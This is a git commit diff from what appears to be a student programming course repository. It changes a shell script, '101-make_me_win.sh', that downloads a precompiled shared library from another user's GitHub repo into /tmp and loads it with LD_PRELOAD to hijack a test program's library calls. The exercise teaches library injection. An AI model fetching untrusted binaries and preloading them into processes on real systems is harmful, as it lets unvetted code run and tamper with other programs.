bc2bcae5bba5df44f4471b0248be31ad773264a7
mz-jennytech <okosisijenifer@gmail.com>
2022-12-14 16:13:58 -0800

    task 3

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp/ https://github.com/juzorh/alx-low_level_programming/blob/master/0x18-dynamic_libraries/nrandom.so?raw=true
-export LD_PRELOAD=/tmp/nrandom
+wget -P /tmp https://github.com/sidneyriffic/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/putshack.so
+export LD_PRELOAD=/tmp/putshack.so
